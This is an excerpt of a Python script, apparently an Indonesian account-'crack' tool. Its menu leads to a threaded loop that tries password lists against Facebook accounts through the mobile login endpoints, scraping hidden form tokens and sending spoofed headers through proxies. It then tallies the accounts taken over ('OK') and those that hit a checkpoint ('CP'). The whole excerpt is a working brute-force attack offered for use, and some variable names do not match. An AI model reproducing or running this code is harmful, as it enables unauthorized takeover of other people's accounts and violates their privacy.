...
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {U}[{hh}01{U}] CRACK PUBLIK     [{hh}07{K}] CRACK SEARCH")
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"iphone.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"mobile.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			link = ses.get("https://{url}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&ref=dbl&fl&login_from_aymh=1'.format(url)").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'login': 'Shiga Ciki', 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": "2152", "x-fb-lsd": data["lsd"], "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&ref=dbl&fl&login_from_aymh=1", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bx = ses.post(f"https://{url}/login/device-based/regular/login/next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&amp;refsrc=deprecated&amp;lwv=100&amp;ref=dbl",data=date, headers=head,proxies=proxy)
